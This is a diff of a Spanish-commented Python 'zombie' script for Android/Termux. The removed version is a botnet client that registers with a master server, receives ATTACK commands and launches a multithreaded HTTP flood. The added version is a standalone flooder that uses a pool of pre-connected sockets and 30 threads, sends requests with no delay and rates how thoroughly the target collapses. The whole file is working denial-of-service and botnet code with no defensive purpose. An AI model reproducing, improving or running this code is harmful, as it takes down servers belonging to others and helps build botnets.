@@ -1,207 +1,203 @@
 #!/data/data/com.termux/files/usr/bin/python3
 """
-🤖 ZOMBIE FINAL - PARA MAESTRO TERMINAL
-Ataque BRUTAL garantizado
+⚡ ZOMBIE ULTRA-OPTIMIZADO - POOL DE SOCKETS
 """
 
 import socket
 import threading
 import time
 import random
-import sys
 
-# Configuración
-MASTER_IP = "192.168.1.10"  # CAMBIA ESTO
-MASTER_PORT = 9999
-ZOMBIE_ID = f"ANDROID_{random.randint(1000,9999)}"
+# CONFIGURACIÓN
+TARGET_IP = "192.168.1.100"
+TARGET_PORT = 8080
+DURATION = 20
 
-# Colores para terminal
-class Colors:
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    RED = '\033[91m'
-    BLUE = '\033[94m'
-    END = '\033[0m'
+# POOL DE SOCKETS GLOBAL
+SOCKET_POOL = []
+SOCKET_LOCK = threading.Lock()
+REQUEST_COUNT = 0
+ERROR_COUNT = 0
 
-def log(msg):
-    timestamp = time.strftime("%H:%M:%S")
-    print(f"{Colors.BLUE}[{timestamp}]{Colors.END} {msg}")
+def crear_socket_pool(tamaño=100):
+    """Crear pool de sockets PRE-CONECTADOS"""
+    print(f"🛠️ Creando pool de {tamaño} sockets...")
+    
+    for _ in range(tamaño):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.1)  # 100ms timeout
+            s.connect((TARGET_IP, TARGET_PORT))
+            
+            with SOCKET_LOCK:
+                SOCKET_POOL.append(s)
+        except Exception as e:
+            print(f"⚠️ Error creando socket: {e}")
+    
+    print(f"✅ Pool creado: {len(SOCKET_POOL)} sockets")
 
-def brutal_attack(target_ip, target_port, duration):
-    """ATAQUE BRUTAL SIN SLEEP"""
-    log(f"{Colors.RED}💀 INICIANDO ATAQUE BRUTAL{Colors.END}")
-    log(f"🎯 Objetivo: {target_ip}:{target_port}")
-    log(f"⏱️  Duración: {duration}s")
+def atacante_optimizado(id_atacante, duracion):
+    """Atacante que REUSA sockets del pool"""
+    global REQUEST_COUNT, ERROR_COUNT
     
-    end_time = time.time() + duration
-    request_count = 0
+    tiempo_fin = time.time() + duracion
+    contador_local = 0
     
-    # PRE-COMPILAR REQUEST (más rápido)
-    http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode()
+    # REQUEST PRE-COMPILADO
+    http_request = f"GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n".encode()
     
-    # CONTADOR COMPARTIDO
-    counters = {'total': 0, 'errors': 0}
-    
-    def attacker_thread(thread_id):
-        """Hilo de ataque individual"""
-        local_count = 0
-        while time.time() < end_time and counters['errors'] < 1000:
-            try:
-                # SOCKET NUEVO CADA REQUEST (más carga)
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.05)  # 50ms timeout - MUY CORTO
-                
-                # CONECTAR Y ENVIAR
-                s.connect((target_ip, target_port))
-                s.send(http_request)
-                s.close()
-                
-                local_count += 1
-                counters['total'] += 1
-                
-                # SIN SLEEP - MÁXIMA VELOCIDAD
-                # time.sleep(0)  # ¡CERO!
-                
-            except socket.timeout:
-                counters['errors'] += 1
-            except ConnectionRefusedError:
-                log(f"{Colors.YELLOW}⚠️  ¡SERVIDOR SATURADO! Conexión rechazada{Colors.END}")
-                counters['errors'] += 100  # Muchos errores = servidor caído
-                break
-            except:
-                counters['errors'] += 1
+    while time.time() < tiempo_fin and ERROR_COUNT < 10000:
+        socket_actual = None
         
-        if local_count > 0:
-            log(f"[Thread {thread_id}] {local_count} requests")
+        try:
+            # 1. TOMAR SOCKET DEL POOL (o crear nuevo si no hay)
+            with SOCKET_LOCK:
+                if SOCKET_POOL:
+                    socket_actual = SOCKET_POOL.pop()
+                else:
+                    # Crear socket nuevo si pool vacío
+                    socket_actual = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    socket_actual.settimeout(0.05)
+                    socket_actual.connect((TARGET_IP, TARGET_PORT))
+            
+            # 2. ENVIAR MÚLTIPLES REQUESTS POR LA MISMA CONEXIÓN
+            for _ in range(50):  # 50 requests por conexión
+                if time.time() > tiempo_fin:
+                    break
+                
+                try:
+                    socket_actual.send(http_request)
+                    contador_local += 1
+                    REQUEST_COUNT += 1
+                    
+                    # SIN SLEEP ENTRE REQUESTS
+                    # time.sleep(0)  # ¡CERO!
+                    
+                except BrokenPipeError:
+                    # Conexión rota, salir del loop
+                    ERROR_COUNT += 1
+                    break
+                except:
+                    ERROR_COUNT += 1
+            
+            # 3. DEVOLVER SOCKET AL POOL (NO CERRAR)
+            if socket_actual:
+                with SOCKET_LOCK:
+                    SOCKET_POOL.append(socket_actual)
+            
+        except (ConnectionRefusedError, ConnectionResetError):
+            ERROR_COUNT += 100
+            print(f"🔥 ¡SERVIDOR SATURADO! Conexiones rechazadas")
+            # Intentar recrear socket
+            try:
+                nuevo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                nuevo_socket.settimeout(0.05)
+                nuevo_socket.connect((TARGET_IP, TARGET_PORT))
+                with SOCKET_LOCK:
+                    SOCKET_POOL.append(nuevo_socket)
+            except:
+                pass
+        except socket.timeout:
+            ERROR_COUNT += 1
+        except Exception as e:
+            ERROR_COUNT += 1
+            # Si el socket está roto, no devolver al pool
+            continue
     
-    # LANZAR 25 HILOS DE ATAQUE POR ZOMBIE
-    log(f"{Colors.GREEN}🚀 Iniciando 25 hilos de ataque...{Colors.END}")
+    if contador_local > 0:
+        print(f"[Atacante {id_atacante}] {contador_local:,} requests")
+
+def ataque_principal():
+    """Función principal de ataque"""
+    print(f"\n💀 ATAQUE ULTRA-OPTIMIZADO INICIADO")
+    print(f"🎯 Objetivo: {TARGET_IP}:{TARGET_PORT}")
+    print(f"⏱️ Duración: {DURATION}s")
     
-    threads = []
-    for i in range(25):
-        t = threading.Thread(target=attacker_thread, args=(i+1,))
-        t.daemon = True
-        threads.append(t)
-        t.start()
+    # Crear pool inicial
+    crear_socket_pool(200)  # 200 sockets pre-conectados
     
-    # MONITOREO
-    start_time = time.time()
-    while time.time() < end_time and any(t.is_alive() for t in threads):
-        elapsed = time.time() - start_time
-        if elapsed > 1:
-            rps = counters['total'] / elapsed
-            log(f"📊 {int(elapsed)}s: {counters['total']:,} reqs | {rps:,.0f} RPS")
+    # INICIAR HILOS DE ATAQUE
+    print(f"🚀 Lanzando 30 hilos optimizados...")
+    hilos = []
+    
+    for i in range(30):
+        hilo = threading.Thread(
+            target=atacante_optimizado,
+            args=(i+1, DURATION),
+            daemon=True
+        )
+        hilos.append(hilo)
+        hilo.start()
+    
+    # MONITOR EN TIEMPO REAL
+    print(f"\n📊 MONITOR EN TIEMPO REAL")
+    print("-" * 50)
+    
+    inicio = time.time()
+    ultimo_contador = 0
+    
+    while time.time() < inicio + DURATION + 2:
+        tiempo_transcurrido = time.time() - inicio
+        
+        if tiempo_transcurrido > 1:
+            rps_actual = (REQUEST_COUNT - ultimo_contador) / 1.0
+            ultimo_contador = REQUEST_COUNT
+            
+            print(f"[{int(tiempo_transcurrido)}s] "
+                  f"Requests: {REQUEST_COUNT:,} | "
+                  f"RPS: {rps_actual:.0f} | "
+                  f"Pool: {len(SOCKET_POOL)} sockets | "
+                  f"Errores: {ERROR_COUNT:,}")
+        
         time.sleep(1)
     
-    # FINALIZAR
-    for t in threads:
-        t.join(timeout=1)
+    # ESPERAR HILOS
+    for hilo in hilos:
+        hilo.join(timeout=1)
     
-    total_time = time.time() - start_time
-    final_rps = counters['total'] / total_time if total_time > 0 else 0
+    # RESULTADOS FINALES
+    tiempo_total = time.time() - inicio
+    rps_promedio = REQUEST_COUNT / tiempo_total if tiempo_total > 0 else 0
     
-    log(f"{Colors.GREEN}✅ ATAQUE COMPLETADO{Colors.END}")
-    log(f"📈 Requests totales: {counters['total']:,}")
-    log(f"❌ Errores: {counters['errors']:,}")
-    log(f"⚡ RPS promedio: {final_rps:,.0f}")
+    print(f"\n✅ ATAQUE COMPLETADO")
+    print(f"📈 Requests totales: {REQUEST_COUNT:,}")
+    print(f"❌ Errores: {ERROR_COUNT:,}")
+    print(f"⚡ RPS promedio: {rps_promedio:.0f}")
+    print(f"🎯 Target: {TARGET_IP}:{TARGET_PORT}")
+    print(f"🔌 Sockets en pool: {len(SOCKET_POOL)}")
     
-    if counters['errors'] > counters['total'] * 0.5:
-        log(f"{Colors.RED}🔥 ¡SATURACIÓN EXITOSA! Servidor probablemente caído{Colors.END}")
+    # LIMPIAR POOL
+    print(f"🧹 Limpiando pool de sockets...")
+    with SOCKET_LOCK:
+        for sock in SOCKET_POOL:
+            try:
+                sock.close()
+            except:
+                pass
+        SOCKET_POOL.clear()
+    
+    # EVALUACIÓN
+    print(f"\n📋 EVALUACIÓN DE EFECTIVIDAD:")
+    if rps_promedio > 5000:
+        print("💀 ¡ATAQUE EXITOSO! Server debería estar colapsado")
+    elif rps_promedio > 2000:
+        print("🔥 Ataque fuerte. Server bajo estrés severo")
+    elif rps_promedio > 1000:
+        print("⚠️ Ataque moderado. Server bajo estrés")
     else:
-        log(f"{Colors.YELLOW}⚠️  Servidor resistente, considerar más bots{Colors.END}")
-    
-    return counters['total']
+        print("📉 Ataque débil. Limitaciones de dispositivo/red")
+        print("   Recomendación: Usar múltiples dispositivos")
 
-def connect_to_master():
-    """Conexión principal al maestro"""
-    log(f"{Colors.GREEN}🤖 ZOMBIE {ZOMBIE_ID} ACTIVADO{Colors.END}")
-    log(f"🎯 Conectando a maestro: {MASTER_IP}:{MASTER_PORT}")
-    
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(30)
-            sock.connect((MASTER_IP, MASTER_PORT))
-            
-            # Enviar identificación
-            sock.send(f"HELLO|{ZOMBIE_ID}|ANDROID\n".encode())
-            
-            # Recibir respuesta
-            welcome = sock.recv(1024).decode()
-            if "HELLO" in welcome:
-                log(f"{Colors.GREEN}✅ CONECTADO AL MAESTRO{Colors.END}")
-                log("🔄 Esperando órdenes de ataque...")
-            
-            # ESCUCHAR COMANDOS
-            while True:
-                try:
-                    # Enviar ping periódico
-                    sock.send(b"PING\n")
-                    
-                    # Recibir comandos
-                    data = sock.recv(1024).decode().strip()
-                    if not data:
-                        break
-                    
-                    if data == "PONG":
-                        pass  # Keep-alive normal
-                    
-                    elif data.startswith("ATTACK|"):
-                        # ¡COMANDO DE ATAQUE!
-                        parts = data.split("|")
-                        if len(parts) >= 6:
-                            _, target, port, duration, intensity, mode = parts
-                            
-                            log(f"{Colors.RED}🔥 ¡ORDEN DE ATAQUE RECIBIDA!{Colors.END}")
-                            log(f"🎯 {target}:{port} por {duration}s")
-                            log(f"💥 Intensidad: {intensity} RPS | Modo: {mode}")
-                            
-                            # Ejecutar ataque en hilo separado
-                            attack_thread = threading.Thread(
-                                target=brutal_attack,
-                                args=(target, int(port), int(duration)),
-                                daemon=True
-                            )
-                            attack_thread.start()
-                            
-                            # Reportar inicio
-                            sock.send(f"REPORT|Attack started|{ZOMBIE_ID}\n".encode())
-                    
-                    # Pequeña pausa para no saturar
-                    time.sleep(5)
-                    
-                except socket.timeout:
-                    continue
-                except:
-                    break
-            
-            sock.close()
-            log("🔌 Desconectado del maestro. Reconectando...")
-            
-        except ConnectionRefusedError:
-            log(f"{Colors.RED}❌ No se puede conectar al maestro{Colors.END}")
-            log("   Verifica IP y que el maestro esté ejecutándose")
-        except Exception as e:
-            log(f"{Colors.YELLOW}⚠️  Error: {str(e)[:50]}{Colors.END}")
-        
-        # Esperar antes de reconectar
-        log("⏳ Intentando reconexión en 5 segundos...")
-        time.sleep(5)
-
+# Para ejecutar DIRECTAMENTE (sin maestro)
 if __name__ == "__main__":
-    # Verificar conexión de red
-    try:
-        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        test_sock.settimeout(3)
-        test_sock.connect(("8.8.8.8", 53))
-        test_sock.close()
-    except:
-        log(f"{Colors.RED}❌ Sin conexión de red{Colors.END}")
-        sys.exit(1)
+    print("⚡ ZOMBIE ULTRA-OPTIMIZADO - MODO AUTÓNOMO")
+    print("=" * 60)
     
     try:
-        connect_to_master()
+        ataque_principal()
     except KeyboardInterrupt:
-        log(f"{Colors.YELLOW}👋 Zombie terminado por usuario{Colors.END}")
+        print(f"\n⏹️ Ataque interrumpido por usuario")
     except Exception as e:
-        log(f"{Colors.RED}💀 Error fatal: {e}{Colors.END}")
+        print(f"❌ Error: {e}")
+    
+    print("\n" + "=" * 60)
